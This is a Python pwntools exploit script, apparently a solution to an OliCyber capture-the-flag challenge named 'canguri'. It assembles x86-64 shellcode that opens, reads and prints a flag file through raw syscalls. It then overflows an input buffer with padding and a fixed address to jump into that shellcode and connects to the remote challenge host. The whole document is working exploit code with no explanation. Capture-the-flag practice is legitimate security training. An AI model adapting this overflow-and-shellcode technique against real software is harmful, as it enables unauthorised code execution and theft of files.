#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'canguri', checksec=False)

host = args.HOST or 'kangaroo.challs.olicyber.it'
port = int(args.PORT or 20005)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --


exploit_code = """
    sub rsp, 0x50
    mov rax, 0x02
    mov rdi, rsp
    mov rsi, 0x00
    mov rdx, 0x00
    syscall

    mov rdi, rax
    mov rsi, rsp
    mov dl, 0x17
    mov al, 0x00
    syscall

    mov ax, 0x01
    mov edi, 0x01
    syscall
"""

context.arch = 'amd64'
context.os = 'linux'
exploit = asm(exploit_code)
print(len(exploit))

io = start()

io.sendlineafter(b'?\n', b'/home/problemuser/flag.txt\x00\x00' + b'A' * 44 + p64(0x4040c0))
io.sendlineafter(b'.\n', exploit)

io.interactive()